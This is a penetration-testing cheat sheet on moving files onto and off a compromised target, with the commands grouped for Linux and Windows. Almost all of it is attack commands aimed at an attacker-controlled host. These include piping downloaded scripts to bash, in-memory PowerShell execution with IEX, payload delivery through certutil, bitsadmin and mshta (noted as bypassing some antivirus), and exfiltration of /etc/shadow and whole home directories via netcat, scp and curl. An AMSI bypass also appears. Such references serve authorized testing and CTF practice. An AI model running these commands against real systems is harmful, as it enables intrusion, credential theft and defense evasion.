# 📂 File Transfer Reference

> **Getting files on and off the target.** Organized by OS and scenario.

---

## Quick Decision Guide

| Scenario | Best Method |
|---|---|
| Linux target, wget/curl available | Python HTTP server → wget/curl |
| Linux target, no tools | Netcat or base64 copy-paste |
| Windows target, PowerShell | IWR (Invoke-WebRequest) |
| Windows target, no PS | certutil |
| No HTTP allowed | Netcat or SMB server |
| Need to transfer both ways | impacket smbserver |
| Very small file, no tools | Base64 encode → paste |

---

## Serving Files From Attacker

Start one of these on your attacker machine, then use the download methods below:

```bash
# Python HTTP server (most common)
python3 -m http.server 8000

# Python HTTPS server
python3 -c "import ssl,http.server; ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('cert.pem','key.pem'); server=http.server.HTTPServer(('0.0.0.0',443),http.server.SimpleHTTPRequestHandler); server.socket=ctx.wrap_socket(server.socket); server.serve_forever()"

# Nginx/Apache (for persistence)
cp file.exe /var/www/html/ && service apache2 start

# SMB server (impacket) — no HTTP port needed
python3 smbserver.py share /path/to/serve -smb2support
python3 smbserver.py share . -smb2support -username user -password pass
```

---

## Linux Target — Downloading Files

- [ ] **wget**:
  ```bash
  wget http://<attacker>:8000/linpeas.sh -O /tmp/linpeas.sh
  wget http://<attacker>:8000/file.tar.gz
  ```
- [ ] **curl**:
  ```bash
  curl http://<attacker>:8000/linpeas.sh -o /tmp/linpeas.sh
  curl -L http://<attacker>:8000/file -o /tmp/file   # follow redirects
  ```
- [ ] **Pipe directly to bash** (no file saved):
  ```bash
  curl http://<attacker>:8000/linpeas.sh | bash
  wget -qO- http://<attacker>:8000/linpeas.sh | sh
  ```
- [ ] **Netcat receive**:
  ```bash
  # Attacker sends:
  nc -nvlp 4444 < file.txt
  
  # Target receives:
  nc <attacker_ip> 4444 > /tmp/file.txt
  ```
- [ ] **Base64** (no tools needed, pure shell):
  ```bash
  # Attacker — encode:
  base64 -w 0 linpeas.sh
  
  # Target — paste and decode:
  echo "<paste_base64_here>" | base64 -d > /tmp/linpeas.sh
  chmod +x /tmp/linpeas.sh
  ```
- [ ] **SCP** (if SSH access FROM target):
  ```bash
  scp /etc/shadow <attacker_user>@<attacker_ip>:/tmp/
  scp <attacker_user>@<attacker_ip>:/tmp/linpeas.sh /tmp/
  ```
- [ ] **Python one-liner** (download):
  ```python
  python3 -c "import urllib.request; urllib.request.urlretrieve('http://<attacker>:8000/file', '/tmp/file')"
  ```
- [ ] **TFTP** (unusual ports, if available):
  ```bash
  tftp <attacker_ip>
  get file.txt
  ```

---

## Windows Target — Downloading Files

- [ ] **PowerShell — Invoke-WebRequest (IWR)**:
  ```powershell
  IWR http://<attacker>:8000/shell.exe -OutFile C:\Temp\shell.exe
  Invoke-WebRequest -Uri http://<attacker>:8000/file -OutFile C:\Temp\file
  
  # When Invoke-WebRequest is aliased to curl:
  (New-Object System.Net.WebClient).DownloadFile('http://<attacker>:8000/file', 'C:\Temp\file')
  ```
- [ ] **PowerShell — DownloadString** (load in memory, no disk write):
  ```powershell
  IEX(New-Object Net.WebClient).DownloadString('http://<attacker>:8000/script.ps1')
  ```
- [ ] **certutil** (always available on Windows):
  ```cmd
  certutil -urlcache -split -f http://<attacker>:8000/file.exe C:\Temp\file.exe
  ```
- [ ] **bitsadmin** (background service, slower):
  ```cmd
  bitsadmin /transfer job http://<attacker>:8000/file.exe C:\Temp\file.exe
  ```
- [ ] **SMB from impacket server** (best for bypassing HTTP egress restrictions):
  ```cmd
  copy \\<attacker_ip>\share\file.exe C:\Temp\file.exe
  
  # Run directly from share (no file copy):
  \\<attacker_ip>\share\shell.exe
  ```
- [ ] **PowerShell IEX from SMB**:
  ```powershell
  IEX(Get-Content \\<attacker_ip>\share\script.ps1 -Raw)
  ```
- [ ] **xcopy / robocopy** (from network share):
  ```cmd
  xcopy \\<attacker_ip>\share\* C:\Temp\ /s
  ```
- [ ] **mshta** (HTML Application — bypass some AV):
  ```cmd
  mshta http://<attacker>:8000/payload.hta
  ```

---

## Linux Target — Uploading Files (Exfil)

- [ ] **Netcat — send file**:
  ```bash
  # Attacker listens:
  nc -nvlp 4444 > received_file
  
  # Target sends:
  nc <attacker_ip> 4444 < /etc/shadow
  cat /etc/shadow | nc <attacker_ip> 4444
  ```
- [ ] **curl upload**:
  ```bash
  curl -X POST http://<attacker>:8000/upload -F "file=@/etc/shadow"
  # (Attacker needs an upload-capable server: pip3 install uploadserver; python3 -m uploadserver)
  ```
- [ ] **Tar + netcat**:
  ```bash
  # Attacker receives:
  nc -nvlp 4444 | tar -xf -
  
  # Target sends entire directory:
  tar -cf - /home/user/ | nc <attacker_ip> 4444
  ```

---

## Windows Target — Uploading Files (Exfil)

- [ ] **PowerShell — upload file to SMB**:
  ```powershell
  copy C:\Users\Administrator\Desktop\root.txt \\<attacker_ip>\share\
  ```
- [ ] **certutil — encode to base64**:
  ```cmd
  certutil -encode C:\root.txt C:\encoded.txt
  type C:\encoded.txt
  # Copy text, decode on attacker:
  base64 -d encoded.txt > root.txt
  ```
- [ ] **PowerShell upload**:
  ```powershell
  $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\root.txt"))
  Invoke-WebRequest -Uri http://<attacker>:8000/ -Method POST -Body $data
  ```

---

## Evil-WinRM Upload/Download

When connected via evil-winrm:

```bash
# Upload to target
upload /local/path/linpeas.sh

# Download from target
download C:\Users\Administrator\Desktop\root.txt

# Load PowerShell script in memory
Bypass-4MSI         # Bypass AMSI first
menu                # Load .Net assemblies menu
```

---

## Working With No Internet (Air-Gapped-Style)

When neither HTTP nor SMB works, fall back to pure shell:

```bash
# Method 1: Type the content directly (for small scripts)
cat > /tmp/linpeas.sh << 'SCRIPT'
#!/bin/bash
# paste script content here
SCRIPT
chmod +x /tmp/linpeas.sh

# Method 2: Split large files
split -b 2048 linpeas.sh linpeas_part_
# Then cat each part on target into base64 and reconstruct
```

---

## 🔗 References

- [LOLBAS — Windows File Transfer](https://lolbas-project.github.io/#/download)
- [GTFOBins — Linux File Transfer](https://gtfobins.github.io/#file-download)
- [PayloadsAllTheThings — File Transfers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md)

---

*[← Wordlists](./wordlists.md) · [Quick Reference Hub](./README.md) · [Reverse Shells →](./reverse_shells.md)*
